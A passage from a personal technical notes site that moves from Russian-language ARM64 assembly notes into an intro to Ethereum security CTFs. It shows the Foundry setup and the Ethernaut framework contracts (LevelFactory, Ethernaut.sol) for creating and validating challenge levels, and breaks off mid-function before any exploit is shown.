</span></span><span style="display:flex;"><span>      10: e1 <span style="color:#8a7b52">03</span> <span style="color:#8a7b52">02</span> 2a  	orr	w1, wzr, w2
</span></span><span style="display:flex;"><span>      14: <span style="color:#8a7b52">41</span> f8 7f d3  	lsl	x1, x2, <span style="color:#95a5a6">#1</span>
</span></span><span style="display:flex;"><span>      18: <span style="color:#8a7b52">41</span> <span style="color:#728e00">fc</span> <span style="color:#8a7b52">41</span> d3  	lsr	x1, x2, <span style="color:#95a5a6">#1</span>
</span></span><span style="display:flex;"><span>      1c: <span style="color:#8a7b52">41</span> <span style="color:#728e00">fc</span> <span style="color:#8a7b52">41</span> <span style="color:#8a7b52">93</span>  	asr	x1, x2, <span style="color:#95a5a6">#1</span>
</span></span><span style="display:flex;"><span>      20: <span style="color:#8a7b52">41</span> <span style="color:#8a7b52">04</span> c2 <span style="color:#8a7b52">93</span>  	extr	x1, x2, x2, <span style="color:#95a5a6">#1</span>
</span></span><span style="display:flex;"><span>      24: <span style="color:#8a7b52">00</span> <span style="color:#8a7b52">00</span> <span style="color:#8a7b52">80</span> d2  	mov	x0, <span style="color:#95a5a6">#0</span>
</span></span><span style="display:flex;"><span>      28: <span style="color:#8a7b52">30</span> <span style="color:#8a7b52">00</span> <span style="color:#8a7b52">80</span> d2  	mov	x16, <span style="color:#95a5a6">#1</span>
</span></span><span style="display:flex;"><span>      2c: <span style="color:#8a7b52">01</span> <span style="color:#8a7b52">10</span> <span style="color:#8a7b52">00</span> d4  	svc	<span style="color:#95a5a6">#0x80</span>
</span></span></code></pre></div><p>Обратим внимание, например, что <code>MOV X0, #0</code> была транслирована в <code>ORR W1, WZR, W2</code>.</p>
</li>
</ul>
</li>
</ul>
<!--list-separator-->
<ul>
<li>
<p>ADD/ADC</p>
<p>Эти инструкции складывают второй и третий параметры и сохраняют
результат сложения в первый: <code>Xd = Xs + Operand2</code>, где <code>Xd</code> и
<code>Xs</code> могут совпадать.</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#d35400">ADD</span><span style="color:#a61717">{</span><span style="color:#434f54">S</span><span style="color:#a61717">}</span> <span style="color:#434f54">Xd</span>, <span style="color:#434f54">Xs</span>, <span style="color:#434f54">Operand2</span>
</span></span></code></pre></div><p>Рассмотрим несколько примеров.</p>
<ol>
<li>
<p>Сложение с константой. Число может быть до 12 бит (0-4095).</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span>   <span style="color:#95a5a6">; X2 = X1 + 4000
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>   <span style="color:#d35400">ADD</span> <span style="color:#434f54">X2</span>, <span style="color:#434f54">X1</span>, <span style="color:#95a5a6">#4000
</span></span></span></code></pre></div></li>
<li>
<p>Со сдвигом влево.</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span>   <span style="color:#95a5a6">; X2 = X1 + 0x20000
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>   <span style="color:#d35400">ADD</span> <span style="color:#434f54">X2</span>, <span style="color:#434f54">X1</span>, <span style="color:#95a5a6">#0x20, LSL 12
</span></span></span></code></pre></div></li>
<li>
<p>Простое сложение 2-х регистров.</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span>   <span style="color:#95a5a6">; X2 = X1 + X0
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>   <span style="color:#d35400">ADD</span> <span style="color:#434f54">X2</span>, <span style="color:#434f54">X1</span>, <span style="color:#434f54">X0</span>
</span></span></code></pre></div></li>
<li>
<p>Сложение регистра со сдвинутым значением в другом регистре.</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span>   <span style="color:#95a5a6">; X2 = X1 + (X0 * 4)
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>   <span style="color:#d35400">ADD</span> <span style="color:#434f54">X2</span>, <span style="color:#434f54">X1</span>, <span style="color:#434f54">X0</span>, <span style="color:#434f54">LSL</span> <span style="color:#8a7b52">2</span>
</span></span></code></pre></div></li>
</ol>
</li>
</ul>
<!--list-separator-->
<ul>
<li>
<p>SUB/SBC</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#d35400">SUB</span><span style="color:#a61717">{</span><span style="color:#434f54">S</span><span style="color:#a61717">}</span> <span style="color:#434f54">Xd</span>, <span style="color:#434f54">Xs</span>, <span style="color:#434f54">Operand2</span>
</span></span></code></pre></div></li>
</ul>
<h4 id="память">
  Память
  <a class="heading-link" href="#%d0%bf%d0%b0%d0%bc%d1%8f%d1%82%d1%8c">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h4>
<p>Для чтения и записи памяти используются инструкции <code>STR</code> и <code>LDR</code>
соответственно.</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#d35400">LDR</span> <span style="color:#434f54">X1</span>, <span style="color:#a61717">=</span><span style="color:#434f54">num</span> <span style="color:#95a5a6">; загружает адрес num в регистр X1
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span><span style="color:#d35400">LDR</span> <span style="color:#434f54">X3</span>, <span style="color:#a61717">=</span><span style="color:#434f54">loc</span> <span style="color:#95a5a6">; загружает адрес loc в регистр X3
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span><span style="color:#d35400">LDR</span> <span style="color:#434f54">X2</span>, [<span style="color:#434f54">X3</span>] <span style="color:#95a5a6">; загружает слово по адресу X3 в X2
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>
</span></span><span style="display:flex;"><span><span style="color:#434f54">.data</span>
</span></span><span style="display:flex;"><span><span style="color:#d35400">num</span> <span style="color:#434f54">.BYTE</span> <span style="color:#8a7b52">0x12</span>
</span></span><span style="display:flex;"><span><span style="color:#d35400">loc</span> <span style="color:#434f54">.QUAD</span> <span style="color:#8a7b52">0x123456789ABCDEF0</span>
</span></span></code></pre></div><h4 id="функции-и-стек">
  Функции и стек
  <a class="heading-link" href="#%d1%84%d1%83%d0%bd%d0%ba%d1%86%d0%b8%d0%b8-%d0%b8-%d1%81%d1%82%d0%b5%d0%ba">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h4>
<p>Стек растёт вниз, <code>SP</code> указывает на его вершину и всегда
выровнен на 16 байт (это важно). У нас есть инструкции <code>STR</code> и
<code>STP</code> для размещения содержимого регистров в стеке, а также
<code>LDR</code> и <code>LDP</code> для считывания данных из стека в регистры.</p>
<p>Чтобы скопировать в стек значение из регистра <code>X5</code>, в котором
хранится число <code>1022</code>:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#d35400">STR</span> <span style="color:#434f54">X5</span>, [<span style="color:#434f54">SP</span>, <span style="color:#95a5a6">#-16]!
</span></span></span></code></pre></div><figure><img src="https://vyorkin.org/ox-hugo/str1.png">
</figure>

<p>Чтобы загрузить в регистр <code>X4</code> значение из вершины стека, где
лежит число <code>1022</code>:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#d35400">LDR</span> <span style="color:#434f54">X4</span>, [<span style="color:#434f54">SP</span>], <span style="color:#95a5a6">#16
</span></span></span></code></pre></div><figure><img src="https://vyorkin.org/ox-hugo/ldr1.png">
</figure>

<h2 id="blockchain">
  Blockchain <span class="tag"><span class="_blockchain">@blockchain</span><span class="blockchain">blockchain</span></span>
  <a class="heading-link" href="#blockchain">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h2>
<h3 id="who-to-follow">
  Who to follow
  <a class="heading-link" href="#who-to-follow">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h3>
<h3 id="hahacks">
  Hahacks
  <a class="heading-link" href="#hahacks">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h3>
<h4 id="hahacks-jul-2022">
  Hahacks, Jul 2022
  <a class="heading-link" href="#hahacks-jul-2022">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h4>
<h4 id="hahacks-aug-2022">
  Hahacks, Aug 2022
  <a class="heading-link" href="#hahacks-aug-2022">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h4>
<h4 id="hahacks-sep-2022">
  Hahacks, Sep 2022
  <a class="heading-link" href="#hahacks-sep-2022">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h4>
<h3 id="evm">
  EVM <span class="tag"><span class="_evm">@evm</span><span class="_solidity">@solidity</span><span class="evm">evm</span><span class="solidity">solidity</span></span>
  <a class="heading-link" href="#evm">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h3>
<h4 id="simple-betting-smart-contract">
  <span class="org-todo done DONE">DONE</span> Simple betting smart contract
  <a class="heading-link" href="#simple-betting-smart-contract">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h4>
<p>Test</p>
<h3 id="ethereum-security-audit">
  Ethereum Security Audit
  <a class="heading-link" href="#ethereum-security-audit">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h3>
<h3 id="my-path-to-blockchain-security-audit">
  My path to blockchain security audit <span class="tag"><span class="security">security</span></span>
  <a class="heading-link" href="#my-path-to-blockchain-security-audit">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h3>
<h3 id="ctf-walkthrough">
  CTF walkthrough <span class="tag"><span class="_ctf">@ctf</span><span class="ctf">ctf</span><span class="security">security</span></span>
  <a class="heading-link" href="#ctf-walkthrough">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h3>
<h4 id="ctf-walkthrough-intro">
  <span class="org-todo done DONE">DONE</span> CTF walkthrough, Intro <span class="tag"><span class="_ctf">@ctf</span><span class="ctf">ctf</span></span>
  <a class="heading-link" href="#ctf-walkthrough-intro">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h4>
<!--list-separator-->
<ul>
<li>
<p>CTF&rsquo;s / War games</p>
<p>CTF&rsquo;s (Capture The Flags) are games/challenges focused on the
Ethereum blockchain that help you to learn security techniques
and concepts. These are the five popular CTF&rsquo;s worth solving
(in this order) to master your Ethereum/Solidity offensive
security skills:</p>
<ol>
<li><a href="https://ethernaut.openzeppelin.com/"  class="external-link" target="_blank" rel="noopener">The Ethernaut</a> is a wargame by <a href="https://www.openzeppelin.com/contracts"  class="external-link" target="_blank" rel="noopener">OpenZeppelin</a>.</li>
<li><a href="https://capturetheether.com/"  class="external-link" target="_blank" rel="noopener">CaptureTheEther</a></li>
<li><a href="https://www.damnvulnerabledefi.xyz/"  class="external-link" target="_blank" rel="noopener">Damn Vulnerable DeFi</a></li>
<li><a href="https://github.com/paradigm-operations/paradigm-ctf-2021"  class="external-link" target="_blank" rel="noopener">Paradigm CTF 2021</a></li>
<li><a href="https://ctf.paradigm.xyz/"  class="external-link" target="_blank" rel="noopener">Paradigm CTF 2022</a> (upcoming)</li>
</ol>
<p>Each level/challenge is a set of vulnerable smart contracts that
you need to exploit. Some of these are trivial, some require
understanding of DeFi protocols and are based on a real security
holes. There are overlapping/similar challenges in Ethernaut and
CaptureTheEther, so you can do one or the other.</p>
<p><strong>Requirements</strong>: Basic knowledge of smart contract development.
No security background required.</p>
</li>
</ul>
<!--list-separator-->
<ul>
<li>
<p>Tools</p>
<p>I&rsquo;m going to play these games locally, since they are open
source. I will use the <a href="https://book.getfoundry.sh/"  class="external-link" target="_blank" rel="noopener">Foundry</a>
toolchain. Foundry is reimplementation of
<a href="https://dapp.tools/"  class="external-link" target="_blank" rel="noopener">dapptools</a>. It is fast, portable,
modular, written in Rust and lets us write tests in Solidity.</p>
<p>We need couple of libraries as well:</p>
<ul>
<li><a href="https://github.com/OpenZeppelin/openzeppelin-contracts"  class="external-link" target="_blank" rel="noopener">openzeppelin-contracts</a> &ndash;
Famous library for secure smart contract development from OpenZeppelin.</li>
<li><a href="https://github.com/foundry-rs/forge-std"  class="external-link" target="_blank" rel="noopener">forge-std</a> &ndash;
Testing library for use with
<a href="https://github.com/foundry-rs/foundry"  class="external-link" target="_blank" rel="noopener">forge and foundry</a>.</li>
</ul>
</li>
</ul>
<!--list-separator-->
<ul>
<li>
<p>Summary</p>
<p>This should be enough to get going. Lets start with the
Ethernaut because it is the most beginner friendly CTF game. If
you don’t want to be spoiled please stop reading and give it a
shot. See you in the next post:
<a href="https://vyorkin.org/posts/ctf-walkthrough-ethernaut-1-hello" >Ethernaut, #1 Hello Ethernaut</a>!</p>
</li>
</ul>
<!--list-separator-->
<ul>
<li>
<p>References</p>
<ul>
<li><a href="https://github.com/blockthreat/blocksec-ctfs"  class="external-link" target="_blank" rel="noopener">blocksec-ctfs</a>
&ndash; A curated list of blockchain security Wargames, Challenges,
and CTF competitions and solution writeups.</li>
</ul>
</li>
</ul>
<h4 id="ethernaut">
  Ethernaut <span class="tag"><span class="ethernaut">ethernaut</span></span>
  <a class="heading-link" href="#ethernaut">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h4>
<!--list-separator-->
<ul>
<li>
<p><span class="org-todo done DONE">DONE</span>  Ethernaut, #1 Hello Ethernaut</p>
<figure><img src="https://vyorkin.org/ox-hugo/ethernaut-hello.jpg">
    </figure>

  <!--list-separator-->
<ul>
<li>
<p>Intro</p>
<p><a href="https://ethernaut.openzeppelin.com/"  class="external-link" target="_blank" rel="noopener">The Ethernaut</a> CTF game
exists for more than 3 years already and has 26 challenges. The
first one is a kind of introductory challenge that gives you
steps on what you need to set up. If you have
<a href="https://metamask.io/"  class="external-link" target="_blank" rel="noopener">Metamask</a> and open the browser&rsquo;s
console, you should see greeting messages:</p>
<figure><img src="https://vyorkin.org/ox-hugo/ethernaut-console.png">
        </figure>

</li>
</ul>
  <!--list-separator-->
<ul>
<li>
<p>Set up</p>
<p>Originally, this game runs on the Rinkeby test network, but
we&rsquo;re going to play it locally. As I mentioned in the
<a href="https://vyorkin.org/posts/ctf-walkthrough-intro" >first post</a>, we will use
<a href="https://book.getfoundry.sh/"  class="external-link" target="_blank" rel="noopener">Foundry</a> toolchain and here is
the initial/empty project layout:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>tree --gitignore
</span></span><span style="display:flex;"><span>.
</span></span><span style="display:flex;"><span>├── foundry.toml
</span></span><span style="display:flex;"><span>├── lib
</span></span><span style="display:flex;"><span>│   └── forge-std
</span></span><span style="display:flex;"><span>├── remappings.txt
</span></span><span style="display:flex;"><span>├── script
</span></span><span style="display:flex;"><span>│   └── Contract.s.sol
</span></span><span style="display:flex;"><span>├── src
</span></span><span style="display:flex;"><span>│   └── Contract.sol
</span></span><span style="display:flex;"><span>└── test
</span></span><span style="display:flex;"><span>    └── Contract.t.sol
</span></span></code></pre></div><p>To make imports easier in the <code>remappings.txt</code> I have these 3
lines:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>forge-std/=lib/forge-std/src/
</span></span><span style="display:flex;"><span>ds-test/=lib/forge-std/lib/ds-test/src/
</span></span><span style="display:flex;"><span>openzeppelin/=lib/openzeppelin-contracts/contracts/
</span></span></code></pre></div><p>The
<a href="https://github.com/vyorkin/ethernaut-solutions/tree/step-0"  class="external-link" target="_blank" rel="noopener">step-0
branch</a> represents the current state of the solutions repo.
This is our starting point.</p>
</li>
</ul>
  <!--list-separator-->
<ul>
<li>
<p>Framework</p>
<p>Next, we need to have some kind of framework that will run the
game. Googling for &ldquo;ethernaut foundry github&rdquo; shows these two repositories:</p>
<ul>
<li><a href="https://github.com/ciaranmcveigh5/ethernaut-x-foundry"  class="external-link" target="_blank" rel="noopener">ethernaut-x-foundry</a>
by <a href="https://github.com/ciaranmcveigh5"  class="external-link" target="_blank" rel="noopener">ciaranmcveigh5</a></li>
<li><a href="https://github.com/StErMi/foundry-ethernaut"  class="external-link" target="_blank" rel="noopener">foundry-ethernaut</a>
by <a href="https://github.com/StErMi"  class="external-link" target="_blank" rel="noopener">StErMi</a></li>
</ul>
<p>I will use them for inspiration.</p>
<p>The <code>Ethernaut.sol</code> is the game&rsquo;s main smart contract. It is
responsible for generating level instances. When we ask for a
new level instance, <code>Ethernaut.sol</code> deploys it to a new <code>address</code>
and returns it.</p>
<p>The <code>LevelFactory.sol</code> is the base smart contract for every game
level factory. We use level factories to deploy levels and check
player&rsquo;s exploits:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#95a5a6">// SPDX-License-Identifier: UNLICENSED
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span><span style="color:#728e00">pragma solidity</span> <span style="color:#728e00">^</span><span style="color:#8a7b52">0</span>.<span style="color:#8a7b52">8</span>.<span style="color:#8a7b52">13</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">import</span> <span style="color:#7f8c8d">&#34;openzeppelin/access/Ownable.sol&#34;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">abstract</span> <span style="color:#728e00">contract</span> <span style="color:#434f54">LevelFactory</span> <span style="color:#728e00">is</span> <span style="color:#434f54">Ownable</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">function</span> <span style="color:#d35400">createInstance</span>(<span style="color:#00979d">address</span> <span style="color:#434f54">_player</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">public</span>
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">payable</span>
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">virtual</span>
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">returns</span> (<span style="color:#00979d">address</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">function</span> <span style="color:#d35400">validateInstance</span>(<span style="color:#00979d">address</span> <span style="color:#728e00">payable</span> <span style="color:#434f54">_instance</span>, <span style="color:#00979d">address</span> <span style="color:#434f54">_player</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">public</span>
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">virtual</span>
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">returns</span> (<span style="color:#00979d">bool</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>It contains two functions:</p>
<ul>
<li><code>createInstance</code> &ndash; Deploys a new level for a given player and
returns the <code>address</code> of the deployed level instance.</li>
<li><code>validateInstance</code> &ndash; Validates state of the level contract
instance after exploit. In other words it checks the win conditions.</li>
</ul>
 <div class="mermaid">
<p>%%{init: {&rsquo;theme&rsquo;:&rsquo;neutral&rsquo;}}%%
classDiagram
class LevelFactory {
+createInstance(address player) address
+validateInstance(address payable instance, address player) bool
}
LevelFactory &lt;|&ndash; Level1Factory
LevelFactory &lt;|&ndash; Level2Factory
LevelFactory &lt;|&ndash; Level3Factory</p>
 </div>
<p>The interaction diagram for a successful exploit scenario:</p>
 <div class="mermaid">
<p>%%{init: {&rsquo;theme&rsquo;:&rsquo;neutral&rsquo;}}%%
sequenceDiagram
actor P as Player
participant E as Ethernaut
participant LF as LevelFactory
participant L as Level</p>
<p>P-&raquo;E: createLevelInstance(levelFactory)
E-&raquo;LF: createInstance(player)
LF-&raquo;LF: prepare ctor args for Level
LF-&raquo;+L: new(args)
L&ndash;&raquo;LF: address
LF&ndash;&raquo;E: address(level)
E-&raquo;E: emit LevelInstanceCreatedLog
E-)P: address(level)
P-&raquo;L: exploit
P-&raquo;E: submitLevelInstance(level)
E-&raquo;LF: validateInstance(level, player)
LF&ndash;&raquo;LF: check win conditions
LF&ndash;&raquo;E: true
E-&raquo;E: emit LevelCompletedLog
E&ndash;&raquo;P: true</p>
 </div>
<p>Now, let&rsquo;s have a closer look at the <code>Ethernaut.sol</code> contract:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span> <span style="color:#95a5a6">// SPDX-License-Identifier: UNLICENSED
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span><span style="color:#728e00">pragma solidity</span> <span style="color:#728e00">^</span><span style="color:#8a7b52">0</span>.<span style="color:#8a7b52">8</span>.<span style="color:#8a7b52">13</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">import</span> <span style="color:#7f8c8d">&#34;./LevelFactory.sol&#34;</span>;
</span></span><span style="display:flex;"><span><span style="color:#728e00">import</span> <span style="color:#7f8c8d">&#34;openzeppelin/access/Ownable.sol&#34;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">contract</span> <span style="color:#434f54">Ethernaut</span> <span style="color:#728e00">is</span> <span style="color:#434f54">Ownable</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#95a5a6">// ----------------------------------
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>    <span style="color:#95a5a6">// Owner interaction
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>    <span style="color:#95a5a6">// ----------------------------------
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">mapping</span>(<span style="color:#00979d">address</span> <span style="color:#728e00">=&gt;</span> <span style="color:#00979d">bool</span>) <span style="color:#434f54">registeredLevels</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#95a5a6">// Only registered levels will be allowed to
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>    <span style="color:#95a5a6">// generate and validate level instances.
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>    <span style="color:#728e00">function</span> <span style="color:#d35400">registerLevel</span>(<span style="color:#434f54">LevelFactory</span> <span style="color:#434f54">_level</span>) <span style="color:#728e00">public</span> <span style="color:#434f54">onlyOwner</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">registeredLevels</span>[<span style="color:#00979d">address</span>(<span style="color:#434f54">_level</span>)] <span style="color:#728e00">=</span> <span style="color:#00979d">true</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#95a5a6">// ----------------------------------
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>    <span style="color:#95a5a6">// Get/submit level instances
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>    <span style="color:#95a5a6">// ----------------------------------
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">struct</span> <span style="color:#434f54">EmittedInstanceData</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#00979d">address</span> <span style="color:#434f54">player</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">LevelFactory</span> <span style="color:#434f54">level</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#00979d">bool</span> <span style="color:#434f54">completed</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">mapping</span>(<span style="color:#00979d">address</span> <span style="color:#728e00">=&gt;</span> <span style="color:#434f54">EmittedInstanceData</span>) <span style="color:#434f54">emittedInstances</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">event</span> <span style="color:#434f54">LevelInstanceCreatedLog</span>(<span style="color:#00979d">address</span> <span style="color:#728e00">indexed</span> <span style="color:#434f54">player</span>, <span style="color:#00979d">address</span> <span style="color:#434f54">instance</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">event</span> <span style="color:#434f54">LevelCompletedLog</span>(<span style="color:#00979d">address</span> <span style="color:#728e00">indexed</span> <span style="color:#434f54">player</span>, <span style="color:#434f54">LevelFactory</span> <span style="color:#434f54">level</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">function</span> <span style="color:#d35400">createLevelInstance</span>(<span style="color:#434f54">LevelFactory</span> <span style="color:#434f54">_level</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">public</span>
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">payable</span>
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">returns</span> (<span style="color:#00979d">address</span>)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#95a5a6">// Ensure level is registered.
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>        <span style="color:#728e00">require</span>(<span style="color:#434f54">registeredLevels</span>[<span style="color:#00979d">address</span>(<span style="color:#434f54">_level</span>)]);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#95a5a6">// Get level factory to create an instance.
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>        <span style="color:#00979d">address</span> <span style="color:#434f54">instance</span> <span style="color:#728e00">=</span> <span style="color:#434f54">_level</span>.<span style="color:#434f54">createInstance</span>{<span style="color:#728e00">value</span><span style="color:#728e00">:</span> <span style="color:#728e00">msg</span>.<span style="color:#728e00">value</span>}(<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#95a5a6">// Store emitted instance relationship with player and level.
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>        <span style="color:#434f54">emittedInstances</span>[<span style="color:#434f54">instance</span>] <span style="color:#728e00">=</span> <span style="color:#434f54">EmittedInstanceData</span>(
</span></span><span style="display:flex;"><span>            <span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#434f54">_level</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#00979d">false</span>
</span></span><span style="display:flex;"><span>        );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#95a5a6">// Retrieve created instance via logs.
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>        <span style="color:#434f54">emit</span> <span style="color:#434f54">LevelInstanceCreatedLog</span>(<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>, <span style="color:#434f54">instance</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#95a5a6">// Return data - not possible to read emitted events via solidity.
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>        <span style="color:#728e00">return</span> <span style="color:#434f54">instance</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">function</span> <span style="color:#d35400">submitLevelInstance</span>(<span style="color:#00979d">address</span> <span style="color:#728e00">payable</span> <span style="color:#434f54">_instance</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">public</span>
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">returns</span> (<span style="color:#00979d">bool</span>)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#95a5a6">// Get player and level.
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>        <span style="color:#434f54">EmittedInstanceData</span> <span style="color:#728e00">storage</span> <span style="color:#728e00">data</span> <span style="color:#728e00">=</span> <span style="color:#434f54">emittedInstances</span>[<span style="color:#434f54">_instance</span>];
</span></span><span style="display:flex;"><span>        <span style="color:#95a5a6">// Instance was emitted for this player.
